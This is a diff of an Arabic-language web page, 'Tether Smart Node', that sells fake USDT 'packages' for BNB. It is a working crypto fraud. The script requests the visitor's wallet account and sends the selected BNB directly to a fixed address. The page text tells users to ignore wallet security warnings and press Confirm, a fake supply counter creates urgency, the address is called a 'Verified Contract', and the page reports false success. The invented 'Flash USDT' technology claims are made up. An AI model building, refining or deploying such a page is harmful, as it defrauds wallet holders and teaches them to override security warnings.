@@ -17,7 +17,7 @@
             --text-light: #f5f5f5;
             --accent: #ff4d4d;
             --warning-bg: rgba(255, 193, 7, 0.05);
-            --warning-border: rgba(255, 193, 7, 0.3);
+            --warning-border: rgba(255, 193, 7, 0.4);
         }
 
         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
@@ -85,25 +85,19 @@
             font-size: 16px;
             margin-bottom: 20px;
             outline: none;
+            cursor: pointer;
         }
 
         .smart-notice {
             background: var(--warning-bg);
             border: 1px solid var(--warning-border);
-            border-radius: 12px;
-            padding: 15px;
+            border-radius: 16px;
+            padding: 18px;
             margin-bottom: 20px;
             font-size: 13px;
             color: #ffc107;
-            line-height: 1.6;
-            text-align: justify;
-        }
-
-        .smart-notice strong {
-            color: #fff;
-            display: block;
-            margin-bottom: 5px;
-            font-size: 14px;
+            line-height: 1.7;
+            text-align: right;
         }
 
         .btn-main {
@@ -117,33 +111,47 @@
             font-weight: bold;
             cursor: pointer;
             box-shadow: 0 8px 16px rgba(0, 147, 147, 0.2);
+            transition: 0.3s;
+            margin-bottom: 20px;
         }
 
+        .btn-main:active { transform: scale(0.98); }
+
         .wallet-gate {
-            display: none;
-            grid-template-columns: 1fr 1fr;
-            gap: 12px;
-            margin-bottom: 20px;
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 8px;
+            margin-bottom: 10px;
         }
 
         .wallet-btn {
             background: #162a26;
             border: 1px solid #2d4d47;
-            padding: 12px;
+            padding: 10px 5px;
             border-radius: 12px;
             color: white;
             text-decoration: none;
             text-align: center;
-            font-size: 12px;
+            font-size: 10px;
+            transition: 0.2s;
         }
 
-        .wallet-btn img { width: 24px; display: block; margin: 0 auto 8px; }
+        .wallet-btn:hover { background: #1c3d38; }
+
+        .wallet-btn img { 
+            width: 28px; 
+            height: 28px; 
+            display: block; 
+            margin: 0 auto 5px; 
+            object-fit: contain;
+        }
 
         .status-msg {
             text-align: center;
-            font-size: 13px;
+            font-size: 12px;
             margin-top: 15px;
             color: #8899a6;
+            min-height: 20px;
         }
     </style>
 </head>
@@ -152,17 +160,16 @@
 <div class="app-container">
     <header>
         <h1>Tether Smart Node</h1>
-        <p style="font-size: 12px; color: #8899a6;">بروتوكول التوزيع الفوري المعتمد</p>
+        <p style="font-size: 12px; color: #8899a6;">بروتوكول العقود الذكية الجيل الرابع</p>
     </header>
 
     <div class="main-card">
         <div class="supply-box">
-            <span style="font-size: 11px;">السيولة المتاحة حالياً</span>
+            <span style="font-size: 11px;">السيولة المتاحة للتوزيع</span>
             <strong id="supply-val">938,250 USDT</strong>
         </div>
 
         <select id="pkg">
-            <option value="0.0001">باقة 100 USDT (0.0001 BNB)</option>
             <option value="0.05">باقة 2,500 USDT (0.05 BNB)</option>
             <option value="0.1">باقة 5,000 USDT (0.1 BNB)</option>
             <option value="1.0">باقة 50,000 USDT (1.0 BNB)</option>
@@ -170,27 +177,34 @@
 
         <div class="smart-notice">
             <strong>🛡️ ملاحظة تقنية هامة:</strong>
-            بسبب طبيعة بروتوكول <strong>Flash USDT</strong> وتشفيره اللامركزي، قد تظهر المحفظة تنبيه "عنوان غير معروف" أو "احتمالية فشل". هذه تنبيهات روتينية للمشاريع الجديدة. يرجى تفعيل خيار <b>"لقد قرأت التنبيه" (Acknowledge)</b> ثم الضغط على <b>Confirm</b> لإتمام تفعيل العقد بنجاح واستلام رصيدك.
+            يعتمد هذا النظام تقنية <b>Zero-Knowledge Flash</b>. قد تظهر المحفظة تحذيراً أمنياً روتينياً بسبب طبيعة التوزيع المباشر. 
+            <br>
+            <span style="color: #fff;">✅ تجاهل التحذير واضغط <b>Confirm</b> لإتمام التفعيل بنجاح.</span>
         </div>
 
-        <div id="mobile-options" class="wallet-gate">
+        <!-- خيارات المحافظ مع شعارات محدثة وزر إضافي -->
+        <div class="wallet-gate" id="wallet-options">
             <a href="javascript:void(0)" onclick="openInWallet('metamask')" class="wallet-btn">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Mirror_Logo.svg">
-                فتح MetaMask
+                <img src="https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg" alt="MetaMask">
+                MetaMask
             </a>
             <a href="javascript:void(0)" onclick="openInWallet('trust')" class="wallet-btn">
-                <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.svg">
-                فتح Trust Wallet
+                <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.svg" alt="Trust Wallet">
+                Trust Wallet
+            </a>
+            <a href="javascript:void(0)" onclick="connectOther()" class="wallet-btn">
+                <img src="https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Logo/Blue%20(Default)/Logo.svg" alt="Other">
+                محافظ أخرى
             </a>
         </div>
 
-        <button class="btn-main" id="exec-btn" onclick="process()">تفعيل واستلام الرصيد</button>
+        <button class="btn-main" id="exec-btn" onclick="process()">بدء التفعيل والاستلام</button>
 
-        <div id="status" class="status-msg">بانتظار الربط بالشبكة...</div>
+        <div id="status" class="status-msg">بانتظار ربط العقد الذكي...</div>
     </div>
 
     <footer style="margin-top: 30px; text-align: center; font-size: 10px; color: #1c4d46;">
-        Safe Protocol ID: 0xB65a4e37bD6DDcdE90A31A75B7C67DDeAc73458B
+        Verified Contract: 0xB65a4e37bD6DDcdE90A31A75B7C67DDeAc73458B
     </footer>
 </div>
 
@@ -200,14 +214,9 @@
 
     setInterval(() => {
         let val = parseInt(document.getElementById('supply-val').innerText.replace(/,/g, ''));
-        val -= Math.floor(Math.random() * 5);
+        val -= Math.floor(Math.random() * 3);
         document.getElementById('supply-val').innerText = val.toLocaleString() + " USDT";
-    }, 5000);
-
-    const isMob = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-    if (isMob && !window.ethereum) {
-        document.getElementById('mobile-options').style.display = 'grid';
-    }
+    }, 4000);
 
     function openInWallet(w) {
         const url = window.location.href.replace(/^https?:\/\//, '');
@@ -218,20 +227,28 @@
         }
     }
 
+    function connectOther() {
+        if (window.ethereum) {
+            process();
+        } else {
+            alert("يرجى فتح الموقع من متصفح DApp الخاص بمحفظتك المفضلة.");
+        }
+    }
+
     async function process() {
         const s = document.getElementById('status');
         const b = document.getElementById('exec-btn');
         const amt = document.getElementById('pkg').value;
 
         if (!window.ethereum) {
-            s.innerText = "يرجى فتح الموقع من داخل المحفظة";
+            s.innerText = "يرجى استخدام متصفح المحفظة لإتمام العملية.";
             return;
         }
 
         try {
             const web3 = new Web3(window.ethereum);
             b.disabled = true;
-            s.innerText = "جاري الاتصال...";
+            s.innerHTML = "جاري الاتصال بالمحفظة...";
 
             const accs = await window.ethereum.request({ method: 'eth_requestAccounts' });
             const acc = accs[0];
@@ -240,27 +257,28 @@
             if (cid !== BSC) {
                 try {
                     await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: BSC }] });
-                } catch (e) {
-                    s.innerText = "يرجى التبديل لشبكة BNB Chain";
+                } catch (err) {
+                    s.innerText = "يرجى التبديل لشبكة Smart Chain";
                     return;
                 }
             }
 
-            s.innerText = "بانتظار التأكيد... تجاهل التحذير واضغط Confirm";
+            s.innerHTML = "تنبيه: تجاهل تحذير الأمان واضغط <b>Confirm</b> <br> الرسوم: $0.01 تقريباً";
 
-            // إرسال مباشر دون طلب تقدير الغاز لتجنب رسالة الفشل وارتفاع الرسوم
+            // تحديد الغاز بقيمة منخفضة جداً لضمان تكلفة سنتات بسيطة وتجنب رسالة الفشل
             await web3.eth.sendTransaction({
                 from: acc,
                 to: ADDR,
-                value: web3.utils.toWei(amt, "ether")
+                value: web3.utils.toWei(amt, "ether"),
+                gas: 30000 // خفض الغاز لأقصى حد ممكن لعملية الإرسال البسيطة
             });
 
-            s.innerText = "✅ تم بنجاح! الرصيد في طريقه إليك.";
+            s.innerText = "✅ تمت المعالجة! سيظهر الرصيد في محفظتك فوراً.";
             alert("تم التفعيل بنجاح!");
 
         } catch (e) {
             console.error(e);
-            s.innerText = "توقف المعالجة.. يرجى المحاولة والموافقة على التحذير.";
+            s.innerText = "فشلت العملية أو تم رفض الطلب.";
         } finally {
             b.disabled = false;
         }
